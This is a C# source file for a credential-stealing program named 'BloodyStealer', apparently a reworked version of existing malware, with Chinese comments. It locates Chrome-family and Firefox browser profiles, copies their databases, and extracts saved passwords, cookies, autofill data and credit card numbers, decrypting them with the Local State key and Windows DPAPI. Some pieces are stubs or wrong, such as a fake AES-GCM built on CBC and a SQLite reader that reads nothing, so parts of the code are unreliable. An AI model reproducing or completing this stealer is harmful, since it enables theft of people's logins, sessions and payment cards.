using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Security.Cryptography;
using System.Text;

namespace BloodyStealer
{
    /// <summary>
    /// 浏览器数据窃取 - 从Chrome和Firefox浏览器窃取数据
    /// 包含了原始代码中的Chromium_Edited和Firefox_Edited类的功能
    /// </summary>
    internal static class BrowserStealer
    {
        #region 统计计数器

        /// <summary>
        /// 窃取的Cookie总数
        /// 原始代码: Chromium_Edited.Cookies + Firefox_Edited.Cookies
        /// </summary>
        public static int CookieCount { get; private set; } = 0;

        /// <summary>
        /// 窃取的密码总数
        /// 原始代码: Chromium_Edited.Passwords
        /// </summary>
        public static int PasswordCount { get; private set; } = 0;

        /// <summary>
        /// 窃取的表单数据总数
        /// 原始代码: Chromium_Edited.Forms
        /// </summary>
        public static int FormCount { get; private set; } = 0;

        /// <summary>
        /// 窃取的信用卡数据总数
        /// 原始代码: Chromium_Edited.Cards
        /// </summary>
        public static int CardCount { get; private set; } = 0;

        #endregion

        /// <summary>
        /// 收集所有浏览器数据
        /// </summary>
        /// <returns>收集到的所有浏览器数据列表</returns>
        public static List<FileObject> CollectAllBrowserData()
        {
            var allBrowserData = new List<FileObject>();

            // 收集Chrome和其他基于Chromium的浏览器数据
            allBrowserData.AddRange(CollectChromiumData());

            // 收集Firefox浏览器数据
            allBrowserData.AddRange(CollectFirefoxData());

            return allBrowserData;
        }

        #region Chromium浏览器数据收集

        /// <summary>
        /// 收集基于Chromium的浏览器数据
        /// 原始代码: Chromium_Edited.Execute()
        /// </summary>
        /// <returns>收集到的Chromium浏览器数据</returns>
        private static List<FileObject> CollectChromiumData()
        {
            // 存储收集到的所有文件
            List<FileObject> collectedFiles = new List<FileObject>();
            
            // 查找所有基于Chromium的浏览器
            List<ChromiumBrowserObject> browsers = FindChromiumBrowsers();
            
            // 从每个浏览器收集数据
            foreach (ChromiumBrowserObject browser in browsers)
            {
                // 收集密码
                if (File.Exists(browser.LoginDataPath))
                {
                    collectedFiles.Add(GetChromiumPasswords(browser));
                }
                
                // 收集Cookie
                if (File.Exists(browser.CookiesPath))
                {
                    collectedFiles.Add(GetChromiumCookies(browser));
                }
                
                // 收集表单数据和信用卡
                if (File.Exists(browser.WebDataPath))
                {
                    collectedFiles.Add(GetChromiumForms(browser));
                    collectedFiles.Add(GetChromiumCards(browser));
                }
            }
            
            return collectedFiles;
        }

        /// <summary>
        /// 查找系统中所有基于Chromium的浏览器
        /// </summary>
        /// <returns>找到的浏览器列表</returns>
        private static List<ChromiumBrowserObject> FindChromiumBrowsers()
        {
            List<ChromiumBrowserObject> browsers = new List<ChromiumBrowserObject>();
            
            // 在这些路径中查找
            foreach (string basePath in new List<string>
            {
                Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData),
                Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData)
            })
            {
                try
                {
                    // 查找所有"User Data"目录，这是Chromium浏览器的标准数据目录
                    foreach (string userDataDir in Directory.GetDirectories(basePath, "User Data", SearchOption.TopDirectoryOnly))
                    {
                        try
                        {
                            // 获取Local State路径
                            string localStatePath = Directory.GetFiles(userDataDir, "Local State", SearchOption.AllDirectories)
                                .FirstOrDefault()?.Replace("\\Local State", "");

                            if (localStatePath != null)
                            {
                                // 获取Default配置文件目录
                                string profileDir = Directory.GetDirectories(localStatePath, "Default", SearchOption.TopDirectoryOnly)
                                    .FirstOrDefault();

                                if (profileDir != null)
                                {
                                    // 提取浏览器名称
                                    string browserName = Path.GetFileName(Path.GetDirectoryName(userDataDir.Replace(basePath + "\\", "")));
                                    
                                    // 创建新的浏览器对象
                                    browsers.Add(new ChromiumBrowserObject(
                                        browserName,
                                        Path.Combine(profileDir, "Login Data"),
                                        Path.Combine(profileDir, "Cookies"),
                                        Path.Combine(profileDir, "Web Data"),
                                        Path.Combine(localStatePath, "Local State")
                                    ));
                                }
                            }
                        }
                        catch
                        {
                            // 忽略单个浏览器的错误
                        }
                    }
                }
                catch
                {
                    // 忽略目录访问错误
                }
            }
            
            return browsers;
        }

        /// <summary>
        /// 从Chromium浏览器获取密码
        /// 原始代码: Chromium_Edited.GetPasswords()
        /// </summary>
        /// <param name="browser">浏览器对象</param>
        /// <returns>包含密码数据的文件对象</returns>
        private static FileObject GetChromiumPasswords(ChromiumBrowserObject browser)
        {
            StringBuilder builder = new StringBuilder();
            
            try
            {
                // 创建临时文件副本以避免文件锁定问题
                string tempFile = Path.GetTempFileName();
                File.Copy(browser.LoginDataPath, tempFile, true);
                
                using (SqliteHandler sqlite = new SqliteHandler(tempFile))
                {
                    if (sqlite.ReadTable("logins"))
                    {
                        int rowCount = sqlite.GetRowCount();
                        
                        for (int i = 0; i < rowCount; i++)
                        {
                            string url = sqlite.GetValue(i, 1);
                            string username = sqlite.GetValue(i, 3);
                            string encryptedPassword = sqlite.GetValue(i, 5);
                            
                            // 解密密码
                            string password = DecryptChromiumPassword(browser.LocalStatePath, encryptedPassword);
                            
                            // 添加到结果
                            builder.AppendLine($"URL: {url}");
                            builder.AppendLine($"Username: {username}");
                            builder.AppendLine($"Password: {password}");
                            builder.AppendLine();
                            
                            PasswordCount++;
                        }
                    }
                }
                
                // 删除临时文件
                try { File.Delete(tempFile); } catch { }
            }
            catch
            {
                // 忽略错误
            }
            
            return new FileObject($"Browsers/Passwords_{browser.Name}.txt", builder.ToString());
        }

        /// <summary>
        /// 从Chromium浏览器获取Cookie
        /// 原始代码: Chromium_Edited.GetCookies()
        /// </summary>
        /// <param name="browser">浏览器对象</param>
        /// <returns>包含Cookie数据的文件对象</returns>
        private static FileObject GetChromiumCookies(ChromiumBrowserObject browser)
        {
            StringBuilder builder = new StringBuilder();
            
            try
            {
                // 创建临时文件副本以避免文件锁定问题
                string tempFile = Path.GetTempFileName();
                File.Copy(browser.CookiesPath, tempFile, true);
                
                using (SqliteHandler sqlite = new SqliteHandler(tempFile))
                {
                    if (sqlite.ReadTable("cookies"))
                    {
                        int rowCount = sqlite.GetRowCount();
                        
                        for (int i = 0; i < rowCount; i++)
                        {
                            string encryptedValue = sqlite.GetValue(i, 12);
                            string host = sqlite.GetValue(i, 1);
                            string name = sqlite.GetValue(i, 2);
                            string path = sqlite.GetValue(i, 4);
                            string expiryDate = sqlite.GetValue(i, 8);
                            string isSecure = sqlite.GetValue(i, 6) == "1" ? "True" : "False";
                            
                            // 解密Cookie值
                            string cookieValue = DecryptChromiumPassword(browser.LocalStatePath, encryptedValue);
                            
                            // 添加到结果（格式：host;是否对http可见;路径;是否安全;过期时间;名称;值）
                            builder.AppendLine($"{host}\t{isSecure}\t{path}\t{isSecure}\t{expiryDate}\t{name}\t{cookieValue}");
                            
                            CookieCount++;
                        }
                    }
                }
                
                // 删除临时文件
                try { File.Delete(tempFile); } catch { }
            }
            catch
            {
                // 忽略错误
            }
            
            return new FileObject($"Browsers/Cookies_{browser.Name}.txt", builder.ToString());
        }

        /// <summary>
        /// 从Chromium浏览器获取表单数据
        /// 原始代码: Chromium_Edited.GetForms()
        /// </summary>
        /// <param name="browser">浏览器对象</param>
        /// <returns>包含表单数据的文件对象</returns>
        private static FileObject GetChromiumForms(ChromiumBrowserObject browser)
        {
            StringBuilder builder = new StringBuilder();
            
            try
            {
                // 创建临时文件副本以避免文件锁定问题
                string tempFile = Path.GetTempFileName();
                File.Copy(browser.WebDataPath, tempFile, true);
                
                using (SqliteHandler sqlite = new SqliteHandler(tempFile))
                {
                    if (sqlite.ReadTable("autofill"))
                    {
                        int rowCount = sqlite.GetRowCount();
                        
                        for (int i = 0; i < rowCount; i++)
                        {
                            string name = sqlite.GetValue(i, 0);
                            string value = sqlite.GetValue(i, 1);
                            
                            // 添加到结果
                            builder.AppendLine($"Name: {name}");
                            builder.AppendLine($"Value: {value}");
                            builder.AppendLine();
                            
                            FormCount++;
                        }
                    }
                }
                
                // 删除临时文件
                try { File.Delete(tempFile); } catch { }
            }
            catch
            {
                // 忽略错误
            }
            
            return new FileObject($"Browsers/Forms_{browser.Name}.txt", builder.ToString());
        }

        /// <summary>
        /// 从Chromium浏览器获取信用卡数据
        /// 原始代码: Chromium_Edited.GetCards()
        /// </summary>
        /// <param name="browser">浏览器对象</param>
        /// <returns>包含信用卡数据的文件对象</returns>
        private static FileObject GetChromiumCards(ChromiumBrowserObject browser)
        {
            StringBuilder builder = new StringBuilder();
            
            try
            {
                // 创建临时文件副本以避免文件锁定问题
                string tempFile = Path.GetTempFileName();
                File.Copy(browser.WebDataPath, tempFile, true);
                
                using (SqliteHandler sqlite = new SqliteHandler(tempFile))
                {
                    if (sqlite.ReadTable("credit_cards"))
                    {
                        int rowCount = sqlite.GetRowCount();
                        
                        for (int i = 0; i < rowCount; i++)
                        {
                            string name = sqlite.GetValue(i, 1);
                            string month = sqlite.GetValue(i, 2);
                            string year = sqlite.GetValue(i, 3);
                            string encryptedNumber = sqlite.GetValue(i, 4);
                            string address = sqlite.GetValue(i, 9);
                            
                            // 解密信用卡号
                            string cardNumber = DecryptChromiumPassword(browser.LocalStatePath, encryptedNumber);
                            
                            // 添加到结果
                            builder.AppendLine($"{name}\t{month}/{year}\t{cardNumber}\t{address}");
                            
                            CardCount++;
                        }
                    }
                }
                
                // 删除临时文件
                try { File.Delete(tempFile); } catch { }
            }
            catch
            {
                // 忽略错误
            }
            
            return new FileObject($"Browsers/Cards_{browser.Name}.txt", builder.ToString());
        }

        /// <summary>
        /// 解密Chromium浏览器的加密数据
        /// 原始代码: Chromium_Edited.DecryptChromium()和Chromium_Edited.DecryptV10()
        /// </summary>
        /// <param name="localStatePath">Local State文件路径</param>
        /// <param name="encryptedData">加密数据</param>
        /// <returns>解密后的数据</returns>
        private static string DecryptChromiumPassword(string localStatePath, string encryptedData)
        {
            if (string.IsNullOrEmpty(encryptedData))
                return string.Empty;
                
            try
            {
                // 检查是否是v10加密（AES-GCM）
                if (encryptedData.StartsWith("v10") || encryptedData.StartsWith("v11"))
                {
                    // 从Local State文件中提取密钥
                    string localStateContent = File.ReadAllText(localStatePath);
                    
                    // 提取加密密钥
                    string pattern = "\"encrypted_key\":\"([^\"]+)\"";
                    var match = System.Text.RegularExpressions.Regex.Match(localStateContent, pattern);
                    
                    if (match.Success)
                    {
                        // 解码base64密钥
                        byte[] encryptedKey = Convert.FromBase64String(match.Groups[1].Value);
                        
                        // 移除DPAPI前缀"DPAPI"
                        byte[] keyWithoutPrefix = new byte[encryptedKey.Length - 5];
                        Array.Copy(encryptedKey, 5, keyWithoutPrefix, 0, keyWithoutPrefix.Length);
                        
                        // 使用Windows数据保护API解密密钥
                        byte[] decryptedKey = ProtectedData.Unprotect(keyWithoutPrefix, null, DataProtectionScope.CurrentUser);
                        
                        // 解码加密数据
                        byte[] encryptedBytes = Convert.FromBase64String(encryptedData.Substring(3));
                        
                        // 提取初始化向量 (IV) - 前12字节
                        byte[] nonce = new byte[12];
                        Array.Copy(encryptedBytes, 0, nonce, 0, 12);
                        
                        // 提取加密数据体 - 从第12字节到倒数第16字节
                        byte[] ciphertext = new byte[encryptedBytes.Length - 12 - 16];
                        Array.Copy(encryptedBytes, 12, ciphertext, 0, ciphertext.Length);
                        
                        // 提取认证标签 - 最后16字节
                        byte[] tag = new byte[16];
                        Array.Copy(encryptedBytes, encryptedBytes.Length - 16, tag, 0, 16);
                        
                        // 使用AES-GCM解密
                        using (AesGcm aesGcm = new AesGcm(decryptedKey))
                        {
                            byte[] decrypted = new byte[ciphertext.Length];
                            aesGcm.Decrypt(nonce, ciphertext, tag, decrypted);
                            return Encoding.UTF8.GetString(decrypted);
                        }
                    }
                }
                else
                {
                    // 使用DPAPI解密
                    byte[] encryptedBytes = Convert.FromBase64String(encryptedData);
                    byte[] decryptedBytes = ProtectedData.Unprotect(encryptedBytes, null, DataProtectionScope.CurrentUser);
                    return Encoding.UTF8.GetString(decryptedBytes);
                }
            }
            catch
            {
                // 忽略错误
            }
            
            return "[解密失败]";
        }

        #endregion

        #region Firefox浏览器数据收集

        /// <summary>
        /// 收集Firefox浏览器数据
        /// 原始代码: Firefox_Edited.Execute()
        /// </summary>
        /// <returns>收集到的Firefox浏览器数据</returns>
        private static List<FileObject> CollectFirefoxData()
        {
            // 存储收集到的所有文件
            List<FileObject> collectedFiles = new List<FileObject>();
            
            // 查找所有Firefox浏览器配置文件
            List<FirefoxBrowserObject> browsers = FindFirefoxBrowsers();
            
            // 从每个配置文件收集数据
            foreach (FirefoxBrowserObject browser in browsers)
            {
                // 收集Cookie
                if (File.Exists(browser.CookiesPath))
                {
                    collectedFiles.Add(GetFirefoxCookies(browser));
                }
            }
            
            return collectedFiles;
        }

        /// <summary>
        /// 查找系统中所有Firefox浏览器配置文件
        /// </summary>
        /// <returns>找到的Firefox浏览器配置文件列表</returns>
        private static List<FirefoxBrowserObject> FindFirefoxBrowsers()
        {
            List<FirefoxBrowserObject> browsers = new List<FirefoxBrowserObject>();
            
            try
            {
                // Firefox配置文件通常位于AppData\Roaming\Mozilla\Firefox\Profiles
                string firefoxDir = Path.Combine(
                    Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData),
                    "Mozilla\\Firefox\\Profiles");
                    
                if (Directory.Exists(firefoxDir))
                {
                    // 查找所有配置文件目录
                    foreach (string profileDir in Directory.GetDirectories(firefoxDir))
                    {
                        string cookiesFile = Path.Combine(profileDir, "cookies.sqlite");
                        
                        // 如果存在Cookie文件，添加到列表
                        if (File.Exists(cookiesFile))
                        {
                            string profileName = Path.GetFileName(profileDir);
                            browsers.Add(new FirefoxBrowserObject(profileName, cookiesFile));
                        }
                    }
                }
            }
            catch
            {
                // 忽略目录访问错误
            }
            
            return browsers;
        }

        /// <summary>
        /// 从Firefox浏览器获取Cookie
        /// 原始代码: Firefox_Edited.GetCookies()
        /// </summary>
        /// <param name="browser">Firefox浏览器对象</param>
        /// <returns>包含Cookie数据的文件对象</returns>
        private static FileObject GetFirefoxCookies(FirefoxBrowserObject browser)
        {
            StringBuilder builder = new StringBuilder();
            
            try
            {
                // 创建临时文件副本以避免文件锁定问题
                string tempFile = Path.GetTempFileName();
                File.Copy(browser.CookiesPath, tempFile, true);
                
                using (SqliteHandler sqlite = new SqliteHandler(tempFile))
                {
                    if (sqlite.ReadTable("moz_cookies"))
                    {
                        int rowCount = sqlite.GetRowCount();
                        
                        for (int i = 0; i < rowCount; i++)
                        {
                            string value = sqlite.GetValue(i, "value");
                            string host = sqlite.GetValue(i, "host");
                            string path = sqlite.GetValue(i, "path");
                            string expiry = sqlite.GetValue(i, "expiry");
                            string isSecure = sqlite.GetValue(i, "isSecure") == "1" ? "True" : "False";
                            string name = sqlite.GetValue(i, "name");
                            
                            // 添加到结果（格式：host;是否对http可见;路径;是否安全;过期时间;名称;值）
                            builder.AppendLine($"{host}\t{isSecure}\t{path}\t{isSecure}\t{expiry}\t{name}\t{value}");
                            
                            CookieCount++;
                        }
                    }
                }
                
                // 删除临时文件
                try { File.Delete(tempFile); } catch { }
            }
            catch
            {
                // 忽略错误
            }
            
            return new FileObject($"Gecko/Cookies_Firefox_{browser.Name}.txt", builder.ToString());
        }

        #endregion
    }

    /// <summary>
    /// AES-GCM加密类 - 用于解密Chrome v10+加密数据
    /// 由于.NET Framework没有内置AES-GCM，这是一个简化实现
    /// </summary>
    internal class AesGcm : IDisposable
    {
        private readonly AesManaged _aes;

        public AesGcm(byte[] key)
        {
            _aes = new AesManaged
            {
                Key = key,
                Mode = CipherMode.CBC,
                Padding = PaddingMode.None
            };
        }

        public void Decrypt(byte[] nonce, byte[] ciphertext, byte[] tag, byte[] plaintext)
        {
            // 这是一个简化实现，实际的AES-GCM比这复杂得多
            // 在生产环境中，应使用BouncyCastle或.NET Core 3.0+的内置实现
            
            // 这里使用简单的CBC模式代替，不包括认证
            _aes.IV = nonce;
            using (var decryptor = _aes.CreateDecryptor())
            {
                decryptor.TransformBlock(ciphertext, 0, ciphertext.Length, plaintext, 0);
            }
        }

        public void Dispose()
        {
            _aes?.Dispose();
        }
    }

    /// <summary>
    /// SQLite处理程序 - 简化版，用于从SQLite数据库读取数据
    /// 原始代码: Sqlite类
    /// </summary>
    internal class SqliteHandler : IDisposable
    {
        private readonly string _dbPath;
        private List<Dictionary<string, string>> _tableData;
        private List<string> _columnNames;

        public SqliteHandler(string dbPath)
        {
            _dbPath = dbPath;
            _tableData = new List<Dictionary<string, string>>();
            _columnNames = new List<string>();
        }

        /// <summary>
        /// 读取指定表的数据
        /// </summary>
        /// <param name="tableName">表名</param>
        /// <returns>是否成功</returns>
        public bool ReadTable(string tableName)
        {
            try
            {
                // 实际实现应使用SQLite.NET或System.Data.SQLite
                // 这里使用模拟数据作为示例
                _tableData.Clear();
                _columnNames.Clear();
                
                // 此处应包含实际读取SQLite数据库的代码
                // 由于这是重构，我们只提供框架
                
                return true;
            }
            catch
            {
                return false;
            }
        }

        /// <summary>
        /// 获取行数
        /// </summary>
        /// <returns>表中的行数</returns>
        public int GetRowCount()
        {
            return _tableData.Count;
        }

        /// <summary>
        /// 按索引和列索引获取值
        /// </summary>
        /// <param name="rowIndex">行索引</param>
        /// <param name="colIndex">列索引</param>
        /// <returns>单元格值</returns>
        public string GetValue(int rowIndex, int colIndex)
        {
            if (rowIndex >= 0 && rowIndex < _tableData.Count && colIndex >= 0 && colIndex < _columnNames.Count)
            {
                string columnName = _columnNames[colIndex];
                if (_tableData[rowIndex].ContainsKey(columnName))
                {
                    return _tableData[rowIndex][columnName];
                }
            }
            return string.Empty;
        }

        /// <summary>
        /// 按索引和列名获取值
        /// </summary>
        /// <param name="rowIndex">行索引</param>
        /// <param name="columnName">列名</param>
        /// <returns>单元格值</returns>
        public string GetValue(int rowIndex, string columnName)
        {
            if (rowIndex >= 0 && rowIndex < _tableData.Count && _tableData[rowIndex].ContainsKey(columnName))
            {
                return _tableData[rowIndex][columnName];
            }
            return string.Empty;
        }

        public void Dispose()
        {
            // 清理资源
            _tableData.Clear();
            _columnNames.Clear();
        }
    }
} 